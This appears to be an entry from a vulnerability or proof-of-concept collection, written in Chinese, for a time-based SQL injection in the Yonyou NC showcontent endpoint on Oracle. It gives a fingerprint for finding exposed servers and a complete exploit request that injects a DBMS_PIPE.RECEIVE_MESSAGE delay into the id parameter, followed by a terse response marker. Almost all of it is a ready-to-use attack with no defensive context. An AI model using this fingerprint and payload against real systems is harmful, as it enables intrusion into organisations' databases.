# 用友NCshowcontentSQL注入漏洞-Oracle

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="UClient.dmg"`
- **请求**：`GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)CHR(76)CHR(108)CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1`
- **响应特征**：999